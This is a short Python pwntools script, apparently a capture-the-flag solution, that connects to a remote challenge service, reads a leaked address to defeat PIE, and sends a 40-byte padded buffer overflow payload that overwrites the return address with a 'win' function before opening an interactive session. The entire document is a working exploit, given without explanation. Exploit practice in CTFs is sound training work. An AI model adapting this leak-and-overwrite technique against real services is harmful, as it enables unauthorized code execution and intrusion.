from pwn import *

context.binary = elf = ELF("./chall")
p = remote("134.112.58.12", 10002)

p.recvuntil(b"MY COORDINATES IN THE ABYSS: ")
leak = int(p.recvline().strip(), 16)

log.info(f"Leak     = {hex(leak)}")

pie_base = leak - 0x1319
log.info(f"PIE base = {hex(pie_base)}")

win_func = pie_base + 0x1229
log.info(f"win      = {hex(win_func)}")

payload = flat(
    b"A" * 40,
    win_func
)

p.recvuntil(b"Speak the demon's true name (15 characters): ")
p.sendline(payload)

p.interactive()